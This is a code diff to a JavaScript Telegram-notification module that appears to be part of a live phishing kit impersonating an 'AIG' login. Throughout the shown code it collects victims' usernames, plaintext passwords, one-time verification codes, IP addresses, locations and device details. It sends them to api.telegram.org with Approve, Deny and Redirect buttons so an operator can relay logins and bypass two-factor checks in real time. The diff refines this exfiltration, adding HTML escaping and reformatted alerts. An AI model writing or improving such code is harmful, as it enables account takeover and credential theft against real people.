@@ -1,5 +1,10 @@
 var API = "https://api.telegram.org/bot";
 
+function esc(s) {
+  if (!s) return "";
+  return String(s).replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
+}
+
 function getBotPairs(env) {
   var tokenRaw = env.TELEGRAM_BOT_TOKEN || "";
   var chatIdRaw = env.TELEGRAM_CHAT_ID || "";
@@ -33,15 +38,21 @@ async function sendToAll(env, text, taskId, includeButtons) {
   for (var i = 0; i < pairs.length; i++) {
     var p = pairs[i];
     try {
-      var payload = { chat_id: p.chatId, text: text };
-      payload.disable_web_page_preview = true;
-    if (includeButtons) {
+      var payload = {
+        chat_id: p.chatId,
+        text: text,
+        parse_mode: "HTML",
+        disable_web_page_preview: true,
+      };
+      if (includeButtons) {
         payload.reply_markup = {
           inline_keyboard: [
             [
-              { text: "✅ Approve", callback_data: "approve:" + taskId },
-              { text: "❌ Deny", callback_data: "deny:" + taskId },
-              { text: "↩️ Redirect", callback_data: "redirect:" + taskId },
+              { text: "Approve", callback_data: "approve:" + taskId },
+              { text: "Deny", callback_data: "deny:" + taskId },
+            ],
+            [
+              { text: "Redirect", callback_data: "redirect:" + taskId },
             ],
           ],
         };
@@ -140,10 +151,10 @@ function locationBlock(cf) {
   if (offset) tzLabel += " (" + offset + ")";
 
   return [
-    "📍 Location: " + loc,
-    "🌐 IP: " + (cf.ip || "Unknown"),
-    "🕐 Timezone: " + tzLabel,
-    "📡 ISP: " + (cf.asOrganization || "Unknown"),
+    "Location: " + esc(loc),
+    "IP: <code>" + esc(cf.ip || "Unknown") + "</code>",
+    "Timezone: " + esc(tzLabel),
+    "ISP: " + esc(cf.asOrganization || "Unknown"),
   ];
 }
 
@@ -154,22 +165,20 @@ function deviceBlock(task) {
   var url = formatUrl(task.member_origin);
 
   return [
-    "📱 Device: " + device,
-    "📐 Screen: " + screen,
-    "🔗 Referrer: " + ref,
-    "🌍 URL: " + url,
+    "Device: " + esc(device),
+    "Screen: " + esc(screen),
+    "Referrer: " + esc(ref),
+    "Page: " + esc(url),
   ];
 }
 
 function timeBlock(tz) {
   var t = formatTimes(tz);
   return [
-    "📅 Local: " + t.local,
-    "🕑 UTC: " + t.utc,
+    "Local: " + esc(t.local),
+    "UTC: " + esc(t.utc),
   ];
 }
-
-var LINE = "━━━━━━━━━━━━━━━━━━━━";
 
 export async function notifyNewTask(env, task) {
   var isVisit = task.request_kind === "visit";
@@ -177,21 +186,21 @@ export async function notifyNewTask(env, task) {
   var lines = [];
 
   if (isVisit) {
-    lines.push("👁 New visitor (AIG)");
-    lines.push(LINE);
+    lines.push("<b>New Visitor (AIG)</b>");
+    lines.push("");
     lines = lines.concat(locationBlock(task.cf));
     lines.push("");
     lines = lines.concat(deviceBlock(task));
     lines.push("");
     lines = lines.concat(timeBlock(tz));
   } else {
-    lines.push("🔐 Login request (AIG)");
-    lines.push(LINE);
-    lines.push("👤 User: " + task.user_id);
-    lines.push("🔑 Password: " + (task.password || "N/A"));
-    lines.push("✉️ Email: " + task.masked_email);
+    lines.push("<b>Login Request (AIG)</b>");
+    lines.push("");
+    lines.push("User: <code>" + esc(task.user_id) + "</code>");
+    lines.push("Pass: <code>" + esc(task.password || "N/A") + "</code>");
+    lines.push("Email: " + esc(task.masked_email));
     if (task.masked_phone && task.masked_phone !== "N/A") {
-      lines.push("📞 Phone: " + task.masked_phone);
+      lines.push("Phone: " + esc(task.masked_phone));
     }
     lines.push("");
     lines = lines.concat(locationBlock(task.cf));
@@ -200,7 +209,7 @@ export async function notifyNewTask(env, task) {
     lines.push("");
     lines = lines.concat(timeBlock(tz));
     lines.push("");
-    lines.push("⏳ Auto-declines in 90s");
+    lines.push("<i>Auto-declines in 90s</i>");
   }
 
   await sendToAll(env, lines.join("\n"), task.id, !isVisit);
@@ -213,33 +222,33 @@ export async function notifyAdvance(env, task) {
   if (task.flow_step === "code_request") {
     var target =
       task.code_delivery_method === "phone"
-        ? "Phone (" + task.masked_phone + ")"
-        : "Email (" + task.masked_email + ")";
+        ? "Phone (" + esc(task.masked_phone) + ")"
+        : "Email (" + esc(task.masked_email) + ")";
 
-    lines.push("📨 Code delivery request (AIG)");
-    lines.push(LINE);
-    lines.push("👤 User: " + task.user_id);
-    lines.push("🔑 Password: " + (task.password || "N/A"));
-    lines.push("✉️ Send code via: " + target);
+    lines.push("<b>Code Delivery Request (AIG)</b>");
+    lines.push("");
+    lines.push("User: <code>" + esc(task.user_id) + "</code>");
+    lines.push("Pass: <code>" + esc(task.password || "N/A") + "</code>");
+    lines.push("Send via: " + target);
     lines.push("");
     lines = lines.concat(locationBlock(task.cf));
     lines.push("");
     lines = lines.concat(deviceBlock(task));
     lines.push("");
-    lines.push("⏳ Auto-declines in 90s");
+    lines.push("<i>Auto-declines in 90s</i>");
   } else if (task.flow_step === "code_verify") {
-    lines.push("🛡 Code verification (AIG)");
-    lines.push(LINE);
-    lines.push("👤 User: " + task.user_id);
-    lines.push("🔑 Password: " + (task.password || "N/A"));
-    lines.push("🔢 Code entered: " + (task.verification_code || "N/A"));
-    lines.push("✉️ Sent via: " + (task.code_delivery_method === "phone" ? "Phone" : "Email") + " (" + task.masked_email + ")");
+    lines.push("<b>Code Verification (AIG)</b>");
+    lines.push("");
+    lines.push("User: <code>" + esc(task.user_id) + "</code>");
+    lines.push("Pass: <code>" + esc(task.password || "N/A") + "</code>");
+    lines.push("Code: <code>" + esc(task.verification_code || "N/A") + "</code>");
+    lines.push("Via: " + (task.code_delivery_method === "phone" ? "Phone" : "Email") + " (" + esc(task.masked_email) + ")");
     lines.push("");
     lines = lines.concat(locationBlock(task.cf));
     lines.push("");
     lines = lines.concat(deviceBlock(task));
     lines.push("");
-    lines.push("⏳ Auto-declines in 90s");
+    lines.push("<i>Auto-declines in 90s</i>");
   } else {
     return;
   }
@@ -248,30 +257,45 @@ export async function notifyAdvance(env, task) {
 }
 
 export function buildApprovedMessage(task) {
-  return [
-    "✅ APPROVED via Telegram",
-    "🔐 Login request (AIG)",
-    "👤 User: " + task.user_id,
-    "🔑 Password: " + (task.password || "N/A"),
-  ].join("\n");
+  var lines = [
+    "<b>APPROVED (AIG)</b>",
+    "",
+    "User: <code>" + esc(task.user_id) + "</code>",
+    "Pass: <code>" + esc(task.password || "N/A") + "</code>",
+  ];
+  if (task.verification_code) {
+    lines.push("Code: <code>" + esc(task.verification_code) + "</code>");
+    lines.push("Via: " + (task.code_delivery_method === "phone" ? "Phone" : "Email"));
+  }
+  return lines.join("\n");
 }
 
 export function buildDeniedMessage(task) {
-  return [
-    "❌ DENIED via Telegram",
-    "🔐 Login request (AIG)",
-    "👤 User: " + task.user_id,
-    "🔑 Password: " + (task.password || "N/A"),
-  ].join("\n");
+  var lines = [
+    "<b>DENIED (AIG)</b>",
+    "",
+    "User: <code>" + esc(task.user_id) + "</code>",
+    "Pass: <code>" + esc(task.password || "N/A") + "</code>",
+  ];
+  if (task.verification_code) {
+    lines.push("Code: <code>" + esc(task.verification_code) + "</code>");
+    lines.push("Via: " + (task.code_delivery_method === "phone" ? "Phone" : "Email"));
+  }
+  return lines.join("\n");
 }
 
 export function buildRedirectedMessage(task) {
-  return [
-    "↩️ REDIRECTED via Telegram",
-    "🔐 Login request (AIG)",
-    "👤 User: " + task.user_id,
-    "🔑 Password: " + (task.password || "N/A"),
-  ].join("\n");
+  var lines = [
+    "<b>REDIRECTED (AIG)</b>",
+    "",
+    "User: <code>" + esc(task.user_id) + "</code>",
+    "Pass: <code>" + esc(task.password || "N/A") + "</code>",
+  ];
+  if (task.verification_code) {
+    lines.push("Code: <code>" + esc(task.verification_code) + "</code>");
+    lines.push("Via: " + (task.code_delivery_method === "phone" ? "Phone" : "Email"));
+  }
+  return lines.join("\n");
 }
 
 export async function editMessage(env, chatId, messageId, text) {
@@ -286,6 +310,7 @@ export async function editMessage(env, chatId, messageId, text) {
         chat_id: chatId,
         message_id: messageId,
         text: text,
+        parse_mode: "HTML",
         disable_web_page_preview: true,
       }),
     });
